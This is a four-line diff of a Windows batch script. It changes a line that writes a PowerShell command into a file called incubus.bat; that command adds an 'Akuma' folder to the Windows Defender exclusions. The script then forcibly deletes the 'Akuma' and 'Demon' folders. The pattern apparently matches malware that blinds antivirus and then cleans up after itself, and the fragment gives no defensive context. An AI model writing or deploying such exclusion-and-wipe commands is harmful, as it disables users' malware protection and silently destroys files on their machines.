@@ -1,4 +1,4 @@
-echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Demon\incubus.bat
+echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma"
 %homedrive%
 rmdir /s /q %homedrive%\Akuma
 rmdir /s /q %homedrive%\Demon
